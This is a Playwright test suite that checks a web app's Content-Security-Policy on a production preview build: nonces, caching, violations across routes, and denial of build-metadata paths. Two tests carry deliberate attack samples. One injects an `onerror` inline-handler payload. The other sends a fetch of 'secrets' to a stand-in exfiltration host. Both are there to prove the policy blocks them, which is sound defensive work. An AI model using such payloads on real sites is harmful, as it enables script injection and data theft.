/**
 * The Content-Security-Policy, as a browser applies it.
 *
 * Everything else about this policy is checked by something that cannot
 * enforce it. `tooling/csp/policy.test.ts` asserts what the string says,
 * `tooling/csp/vitePlugin.test.ts` asserts that the placeholder is replaced and
 * the header matches, `tooling/csp/nginxConfig.test.ts` asserts that the server
 * configuration and the generated snippet agree on three names. None of them
 * can answer the only question that matters — does the application still work
 * under it — because that answer lives in a CSP implementation.
 *
 * So this runs against **:3100, the preview server**, which serves a real
 * production build under the real production policy: no `'unsafe-inline'` for
 * styles, no `ws:`, `upgrade-insecure-requests` on. The dev server at :3000
 * carries two documented relaxations, and a suite that proved the policy there
 * would be proving the wrong policy. See `playwright.config.ts` and
 * `docs/csp.md`.
 *
 * The listener is installed with `addInitScript`, which runs before the page's
 * own scripts. That is the one thing the in-app reporter
 * (`src/shared/security/reportCspViolations.ts`) structurally cannot do: a
 * refusal of the entry script happens before any application code exists to
 * hear it, and that refusal is exactly what a failed nonce substitution looks
 * like.
 */

import { test, expect, type Page } from "@playwright/test";

test.use({ baseURL: "http://localhost:3100" });

interface Violation {
  directive: string;
  blockedURI: string;
  sample: string;
}

/**
 * Routes that between them exercise every directive this policy names:
 * `/labs/images` loads `<img>` and `<source>` sets, `/labs/workers` constructs
 * a `Worker` from a bundled module, `/labs/checkout` is the largest lazy chunk
 * (so `import()` under `'strict-dynamic'`), `/labs/i18n` fetches a locale
 * catalogue over an `import()` of its own, `/labs/infinite-scroll` is the
 * heaviest run of inline styles React sets through the CSSOM, and `/login` is
 * the one route that renders outside the shell.
 */
const ROUTES = [
  "/",
  "/login",
  "/about",
  "/labs/images",
  "/labs/workers",
  "/labs/checkout",
  "/labs/i18n",
  "/labs/infinite-scroll",
] as const;

/** Collects violations from the moment the document exists. */
async function watchViolations(page: Page): Promise<Violation[]> {
  const violations: Violation[] = [];
  await page.exposeFunction("__cspViolation", (violation: Violation) => {
    violations.push(violation);
  });
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (event) => {
      /*
        Looked up when the event fires rather than when this script runs:
        `exposeFunction` installs its binding on its own schedule, and reading
        it once at the top captured `undefined` on some navigations — a
        collector that silently records nothing, which makes every
        `toEqual([])` below pass for the wrong reason.

        The binding is async, so the call returns a promise nothing waits for.
        That is why the assertions that expect a violation poll for it.
      */
      void (
        window as unknown as { __cspViolation?: (v: Violation) => Promise<void> }
      ).__cspViolation?.({
        directive: event.effectiveDirective || event.violatedDirective,
        blockedURI: event.blockedURI,
        sample: event.sample,
      });
    });
  });
  return violations;
}

function describeViolations(violations: readonly Violation[]): string {
  return violations
    .map((v) => `${v.directive} blocked ${v.blockedURI || "(inline)"} ${v.sample}`.trim())
    .join("\n");
}

test.describe("Content-Security-Policy", () => {
  test.skip(
    ({ browserName }) => browserName !== "chromium",
    "Driven in Chromium only: the CI job runs that project, and `securitypolicyviolation` reporting is the part engines disagree about — `sample` and `effectiveDirective` are not filled in everywhere. What is under test is this application's policy, not the engines.",
  );

  test("is enforced, and names a nonce rather than allowing inline script", async ({ page }) => {
    const response = await page.goto("/");
    const policy = response?.headers()["content-security-policy"] ?? "";

    // Enforced, not `-Report-Only`: a report-only policy that happens to be
    // complete is indistinguishable from an enforced one until the day it
    // matters.
    expect(response?.headers()["content-security-policy-report-only"]).toBeUndefined();
    expect(policy).toContain("default-src 'none'");
    expect(policy).toMatch(/script-src [^;]*'nonce-[A-Za-z0-9+/]+={0,2}'/);
    expect(policy).toContain("'strict-dynamic'");
    expect(policy).not.toContain("unsafe-eval");
    expect(policy).not.toContain("unsafe-inline");
  });

  test("mints a fresh nonce per response, and the document carries that one", async ({ page }) => {
    const nonces = new Set<string>();
    for (let visit = 0; visit < 2; visit += 1) {
      const response = await page.goto("/");
      const policy = response?.headers()["content-security-policy"] ?? "";
      const fromHeader = /'nonce-([^']+)'/.exec(policy)?.[1];
      expect(fromHeader).toBeTruthy();

      /*
        Read from the DOM rather than from the HTML source, and that is the
        stronger assertion: a browser clears the `nonce` *content attribute*
        after parsing — so that a CSS selector cannot exfiltrate it — while
        leaving the IDL property in place. `element.nonce` therefore proves the
        browser accepted and kept it, where a text match on the response body
        would only prove `sub_filter` ran.
      */
      const fromDocument = await page.evaluate(
        () => document.querySelector<HTMLMetaElement>('meta[property="csp-nonce"]')?.nonce,
      );
      expect(fromDocument).toBe(fromHeader);
      nonces.add(fromHeader ?? "");
    }
    expect(nonces.size).toBe(2);
  });

  test("never lets a shared cache store the document that carries the nonce", async ({ page }) => {
    const response = await page.goto("/");
    // A nonce two visitors share is not a nonce. This is the one cache header
    // the policy depends on; the hashed assets stay immutable, which is why
    // the substitution happens in the HTML and nowhere else.
    expect(response?.headers()["cache-control"]).toBe("no-store");
  });

  test("still runs the application, on every route", async ({ page }) => {
    const violations = await watchViolations(page);

    for (const route of ROUTES) {
      await page.goto(route, { waitUntil: "networkidle" });
      // Rendered, rather than merely loaded: under `'strict-dynamic'` a blocked
      // entry script leaves a 200 response and an empty `#root`, which is
      // precisely the failure a status-code assertion cannot see.
      await expect(page.locator("#root")).not.toBeEmpty();
      expect(violations, `${route}\n${describeViolations(violations)}`).toEqual([]);
    }
  });

  test("allows the service worker it registers", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");
    // `worker-src 'self'`, spelled out rather than left to fall back to
    // `script-src` — which carries `'strict-dynamic'`, a source expression
    // with no defined meaning for a worker.
    await page.waitForFunction(() => navigator.serviceWorker.controller !== null, undefined, {
      timeout: 30_000,
    });
    expect(violations, describeViolations(violations)).toEqual([]);
  });

  test("blocks an injected inline event handler, which is the whole point", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");

    /*
      An inline event handler, because that is what an injection into this
      application would actually be.

      A `<script>` written into `innerHTML` is the obvious test and proves
      nothing: HTML parsing never executes a script inserted that way, with or
      without a policy. And a script built with `createElement` *does* run
      here, deliberately — `'strict-dynamic'` trusts what already-trusted code
      inserts, which is the concession that lets a bundler lazy-load at all.
      What is left, and what every real HTML-injection payload reaches for, is
      an attribute: `onerror` on an `<img>` whose `src` is guaranteed to fail.
      `script-src-attr` falls back to `script-src`, which has no
      `'unsafe-inline'`, so it never fires.
    */
    const ran = await page.evaluate(() => {
      const marker = "__csp_injection_ran__";
      const injected = document.createElement("div");
      // The one deliberate injection in this repository. `security/no-dangerous-html`
      // is the ban that makes this shape impossible in application code
      // (`docs/xss.md`), and this spec exists to prove that the policy stops it
      // even where the ban was bypassed — which is exactly the scenario the two
      // defences are layered for. Nothing in `e2e/` is in the shipped graph.
      // eslint-disable-next-line security/no-dangerous-html
      injected.innerHTML = `<img src="/does-not-exist.png" onerror="window['${marker}'] = true">`;
      document.body.appendChild(injected);
      return new Promise<boolean>((resolve) => {
        setTimeout(() => {
          resolve((window as unknown as Record<string, boolean>)[marker] === true);
        }, 250);
      });
    });

    expect(ran).toBe(false);
    // And the refusal is observable, which is what
    // `src/shared/security/reportCspViolations.ts` subscribes to.
    await expect.poll(() => violations.map((v) => v.directive)).toContain("script-src-attr");
  });

  test("refuses to fetch an origin connect-src does not name", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");

    const blocked = await page.evaluate(() =>
      fetch("https://exfiltrate.example.com/steal", { method: "POST", body: "secrets" }).then(
        () => false,
        () => true,
      ),
    );

    expect(blocked).toBe(true);
    await expect.poll(() => violations.map((v) => v.directive)).toContain("connect-src");
  });

  test("serves no dot-directory, so the generated policy is not readable", async ({ request }) => {
    /*
      `dist/.csp/policy.conf` and `dist/.vite/manifest.json` are build metadata.
      The manifest was publicly fetchable before this item; the policy would
      have joined it, which is how a build that improved the security posture
      would have published the security posture.

      This asserts it of the *preview* server, and it had to be made true:
      `vite preview` served both with a 200 until the plugin grew a deny rule
      of its own, found by this test. nginx's equivalent is checked statically
      in `tooling/csp/nginxConfig.test.ts`, because nothing in CI runs nginx —
      stated as a gap in `docs/csp.md` rather than papered over.
    */
    for (const path of ["/.csp/policy.conf", "/.vite/manifest.json"]) {
      const response = await request.get(path);
      expect(response.status(), path).not.toBe(200);
    }
  });
});
